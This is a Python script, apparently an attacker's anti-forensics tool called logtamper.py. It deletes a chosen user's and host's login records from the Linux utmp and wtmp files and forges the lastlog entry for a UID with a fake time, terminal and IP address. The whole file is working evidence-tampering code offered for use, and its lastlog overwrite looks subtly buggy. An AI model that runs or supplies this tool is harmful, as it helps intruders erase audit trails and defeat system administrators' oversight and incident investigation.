#!/usr/bin/env python
# -*- coding:utf-8 -*-
# .../logtamper.py -m3 -t pts/1 -u 1000 -i 192.168.2.8 -d 2018:06:27:10:11:12
  
import os, struct, sys
from pwd import getpwnam
from time import strptime, mktime
from optparse import OptionParser
  
UTMPFILE = "/var/run/utmp"
WTMPFILE = "/var/log/wtmp"
LASTLOGFILE = "/var/log/lastlog"
  
LAST_STRUCT = 'I32s256s'
LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)
  
XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
  
  
def getXtmp(filename, username, hostname):
    xtmp = ''
    try:
        fp = open(filename, 'rb')
        while True:
            bytes = fp.read(XTMP_STRUCT_SIZE)
            if not bytes:
                break
  
            data = struct.unpack(XTMP_STRUCT, bytes)
            record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in data]
            if (record[4] == username and record[5] == hostname):
                continue
            xtmp += bytes
    except:
        errexit('Cannot open file: %s' % filename)
    finally:
        fp.close()
    return xtmp
  
def echo(filename, pat):
    try:
        siz = struct.calcsize(pat)
        with open(filename, 'rb') as fp:
            buf = fp.read()
            i = 0
            while i+siz <= len(buf):
                data = struct.unpack(pat, buf[i:i+siz])
                i += siz
                if data[0] == 0: continue
                t,tty,ipa = (data[0], data[1].strip('\x00'), data[2].strip('\x00'))
                print(filename, i/siz-1, t,tty,ipa)
    except Exception,e:
        print('Cannot open file: %s:' % filename, e)
    finally:
        pass #fp.close()
  
def modifyLast(filename, pw_uid, hostname, ttyname, strtime):
    timestamp = 0
    try:
        str2time = strptime(strtime, '%Y:%m:%d:%H:%M:%S')
        timestamp = int(mktime(str2time))
        print(LAST_STRUCT, timestamp, ttyname, hostname)
    except:
        errexit('Time format err.')
  
    echo(filename, LAST_STRUCT)

    #try:
    #    p = getpwnam(username)
    #except:
    #    errexit('No such user.')
  
    try:
        data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)
        with open(filename, 'rb') as fp:
            buf = fp.read()
            if len(buf) < LAST_STRUCT_SIZE * pw_uid + len(data):
                errexit("len-of-file", len(buf), pw_uid)
            buf = list(buf)
            buf[LAST_STRUCT_SIZE * pw_uid : len(data)] = data
        with open(filename, 'wb') as fp:
            #fp.seek(LAST_STRUCT_SIZE * pw_uid)
            fp.write(''.join(buf))
    except Exception,ex:
        print('Cannot open file: %s' % filename, ex)
    finally:
        pass
    echo(filename, LAST_STRUCT)
    return True
  
  
def errexit(*msg):
    print(msg)
    exit(119)
  
def saveFile(filename, contents):
    try:
        fp = open(filename, 'w+b')
        fp.write(contents)
    except IOError as e:
        errexit(e)
    finally:
        fp.close()
  
  
if __name__ == '__main__':
    usage = 'usage: logtamper.py -m 2 -u root -i 192.168.0.188\n \
        logtamper.py -m 3 -u root -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'
    parser = OptionParser(usage=usage)
    parser.add_option('-m', '--mode', dest='MODE', default='1' , help='1: utmp, 2: wtmp, 3: lastlog [default: 1]')
    parser.add_option('-t', '--ttyname', dest='TTYNAME')
    parser.add_option('-f', '--filename', dest='FILENAME')
    parser.add_option('-u', '--username', dest='USERNAME')
    parser.add_option('-i', '--hostname', dest='HOSTNAME')
    parser.add_option('-d', '--dateline', dest='DATELINE')
    (options, args) = parser.parse_args()
  
    if len(args) < 3:
        if options.MODE == '1':
            if options.USERNAME == None or options.HOSTNAME == None:
                errexit('+[Warning]: Incorrect parameter.\n')
  
            if options.FILENAME == None:
                options.FILENAME = UTMPFILE
  
            # tamper
            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
            saveFile(options.FILENAME, newData)
  
        elif options.MODE == '2':
            if options.USERNAME == None or options.HOSTNAME == None:
                errexit('+[Warning]: Incorrect parameter.\n')
  
            if options.FILENAME == None:
                options.FILENAME = WTMPFILE
  
            # tamper
            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
            saveFile(options.FILENAME, newData)
  
        elif options.MODE == '3':
            if options.USERNAME == None or options.HOSTNAME == None or options.TTYNAME == None or options.DATELINE == None:
                errexit('+[Warning]: Incorrect parameter.\n')
  
            if options.FILENAME == None:
                options.FILENAME = LASTLOGFILE
  
            # tamper
            modifyLast(options.FILENAME, int(options.USERNAME), options.HOSTNAME, options.TTYNAME , options.DATELINE)
  
        else:
            parser.print_help()

